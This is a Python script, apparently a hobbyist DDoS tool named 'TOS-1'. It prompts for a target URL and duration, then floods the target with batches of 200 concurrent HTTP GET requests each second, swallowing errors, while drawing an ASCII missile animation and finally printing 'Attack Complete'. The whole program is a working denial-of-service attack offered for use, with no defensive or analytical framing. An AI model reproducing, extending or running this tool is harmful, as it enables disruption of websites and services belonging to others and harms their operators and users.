import asyncio
import aiohttp
import random
import time
import os

# Missile design (static body)
MISSILE_BODY = [
    "  /\\  ",
    "  | |  ",
    "  | |  ",
    "  | |  ",
    "  | |  ",
    "  | |  "
]

# Exhaust options
EXHAUST_FRAMES = ["  ^^  ", "  vv  ", "  **  ", "  ##  ", "  oo  ", "  WW  "]

# Clear terminal
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Countdown loader
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        await asyncio.sleep(1)

# Missile class
class Missile:
    def __init__(self, max_y, max_x):
        self.max_y = max_y
        self.max_x = max_x
        self.reset()

    def reset(self):
        self.x = random.randint(5, self.max_x - 10)
        self.y = self.max_y
        self.speed = random.choice([1, 2, 3])  # random speed
        self.delay_timer = random.randint(0, 10)  # random delay before moving
        self.exhaust = random.choice(EXHAUST_FRAMES)

    def move(self):
        if self.delay_timer > 0:
            self.delay_timer -= 1
        else:
            self.y -= self.speed
            if self.y < 0:
                self.reset()

# Draw all missiles
def draw_missiles(missiles, height):
    buffer = [""] * height
    for missile in missiles:
        # Draw missile body
        for i, line in enumerate(MISSILE_BODY):
            pos = missile.y - len(MISSILE_BODY) + i
            if 0 <= pos < height:
                buffer[pos] += " " * missile.x + line
        # Draw exhaust
        exhaust_pos = missile.y
        if 0 <= exhaust_pos < height:
            buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    clear()
    print("\n".join(buffer))

# HTTP request sender
async def send_requests(target, duration):
    semaphore = asyncio.Semaphore(200)  # max 200 requests/sec
    end_time = time.time() + duration

    async def fetch(session):
        async with semaphore:
            try:
                async with session.get(target) as response:
                    await response.text()
            except:
                pass

    async with aiohttp.ClientSession() as session:
        while time.time() < end_time:
            tasks = [fetch(session) for _ in range(200)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)

# Main function
async def main():
    TERMINAL_HEIGHT = 30
    TERMINAL_WIDTH = 70

    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(30)

    # Initialize missiles
    missiles = [Missile(TERMINAL_HEIGHT, TERMINAL_WIDTH) for _ in range(10)]

    # Start HTTP requests
    request_task = asyncio.create_task(send_requests(target, duration))

    start_time = time.time()
    while time.time() - start_time < duration:
        for missile in missiles:
            missile.move()
        draw_missiles(missiles, TERMINAL_HEIGHT)
        await asyncio.sleep(0.1)

    await request_task
    print("=== TOS-1: Attack Complete ===")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
        print("TOS-1 terminated by user.")
